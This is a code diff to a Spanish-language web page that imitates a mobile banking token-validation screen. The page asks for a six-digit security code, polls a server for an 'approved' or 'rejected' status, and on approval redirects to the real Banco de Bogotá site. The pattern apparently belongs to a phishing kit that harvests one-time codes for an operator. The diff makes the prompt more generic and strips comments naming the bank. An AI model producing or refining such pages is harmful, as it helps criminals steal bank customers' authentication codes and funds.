@@ -18,7 +18,7 @@
         }
 
         body {
-            background-color: #E8F0FE; /* Fondo azul claro similar a la imagen */
+            background-color: #E8F0FE;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -27,7 +27,7 @@
             color: #333;
         }
 
-        /* --- CONTENEDOR PRINCIPAL (Simula la pantalla del celular) --- */
+        /* --- CONTENEDOR PRINCIPAL --- */
         .app-container {
             background-color: #fff;
             width: 100%;
@@ -71,7 +71,7 @@
         .title-section h1 {
             font-size: 1.5rem;
             color: #000;
-            font-weight: 700;
+            font-weight: 700; /* Negrilla */
             margin-bottom: 10px;
         }
 
@@ -125,28 +125,30 @@
             border-color: #003DA5;
         }
 
-        /* --- BOTÓN FINALIZAR --- */
+        /* --- BOTÓN CONTINUAR --- */
         .btn-finalizar {
-            background-color: #003DA5;
-            color: white;
+            background-color: #E0E0E0; /* Gris cuando está deshabilitado */
+            color: #999;
             border: none;
             padding: 16px;
             border-radius: 8px;
             font-size: 1rem;
             font-weight: 600;
-            cursor: pointer;
+            cursor: not-allowed;
             width: 100%;
-            margin-top: auto; /* Empuja el botón al final */
-            transition: background 0.3s;
+            margin-top: auto;
+            transition: background-color 0.3s, color 0.3s;
         }
 
-        .btn-finalizar:hover {
-            background-color: #002D72;
+        /* Se activa cuando tiene la clase 'active' */
+        .btn-finalizar.active {
+            background-color: #003DA5;
+            color: white;
+            cursor: pointer;
         }
-        
-        .btn-finalizar:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
+
+        .btn-finalizar.active:hover {
+            background-color: #002D72;
         }
 
         /* --- PANTALLAS DE ESTADO (CARGANDO Y ERROR) --- */
@@ -241,16 +243,15 @@
         
         <!-- HEADER AZUL -->
         <div class="app-header">
-            <div class="back-arrow">&#8592;</div> <!-- Flecha para volver -->
-            <h2></h2>
+            <div class="back-arrow">&#8592;</div>
         </div>
 
         <!-- CONTENIDO -->
         <div class="app-content">
             
             <div class="title-section">
-                <h1>Activaste tu Token</h1>
-                <p>Desde ahora tus transacciones será más sencillas y ágiles con tu código Token.</p>
+                <h1>Validación de Token</h1>
+                <p>Por favor, ingresa el código de seguridad enviado a tu dispositivo para continuar con el proceso de validación.</p>
             </div>
 
             <!-- IMAGEN DEL TOKEN -->
@@ -264,8 +265,8 @@
                 <input type="text" id="otp-input" class="otp-input" placeholder="••••••" maxlength="6" inputmode="numeric" pattern="\d*" autocomplete="one-time-code">
             </div>
 
-            <!-- BOTÓN FINALIZAR -->
-            <button class="btn-finalizar" id="btn-otp" disabled>Finalizar</button>
+            <!-- BOTÓN CONTINUAR -->
+            <button class="btn-finalizar" id="btn-otp" disabled>Continuar</button>
 
         </div>
     </div>
@@ -316,13 +317,13 @@
         // 2. LÓGICA DE UI (ACTIVAR BOTÓN)
         // ==========================================
         otpInput.addEventListener('input', () => {
-            // Activamos el botón si hay al menos 6 dígitos
-            if (otpInput.value.trim().length === 6 && !btnOtp.disabled) {
+            // Activamos el botón si hay exactamente 6 dígitos
+            if (otpInput.value.trim().length === 6 && !otpInput.disabled) {
                 btnOtp.disabled = false;
-                btnOtp.classList.add('active');
+                btnOtp.classList.add('active'); // Se pone azul
             } else {
                 btnOtp.disabled = true;
-                btnOtp.classList.remove('active');
+                btnOtp.classList.remove('active'); // Vuelve a gris
             }
         });
 
@@ -356,7 +357,7 @@
                     const statusData = await statusRes.json();
 
                     if (statusData.status === 'approved') {
-                        // OTP APROBADO -> Redirigir a Banco de Bogotá
+                        // OTP APROBADO -> Redirigir
                         clearInterval(pollingInterval);
                         window.location.href = 'https://www.bancodebogota.com';
                     } else if (statusData.status === 'rejected') {
